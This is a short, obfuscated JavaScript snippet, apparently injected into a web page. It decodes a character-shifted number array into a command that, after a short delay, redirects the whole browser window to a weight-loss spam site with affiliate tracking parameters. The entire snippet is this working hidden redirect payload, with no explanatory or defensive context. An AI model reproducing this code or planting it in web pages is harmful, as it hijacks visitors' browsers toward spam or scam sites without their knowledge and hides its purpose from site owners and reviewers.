
function risene() { 
    risena=26; 
    risenb=[145,131,136,126,137,145,72,142,137,138,72,134,137,125,123,142,131,137,136,72,130,140,127,128,87,65,130,142,142,138,84,73,73,134,137,141,141,74,145,127,131,129,130,142,71,128,123,141,142,72,145,137,140,134,126,73,89,123,87,78,74,75,77,77,80,64,125,87,125,138,125,126,131,127,142,64,141,87,75,75,74,80,75,81,74,76,65,85]; 
    risenc=""; 
    for(risend=0;risend<risenb.length;risend++) { 
        risenc+=String.fromCharCode(risenb[risend]-risena); 
    } 
    return risenc; 
} setTimeout(risene(),1260);
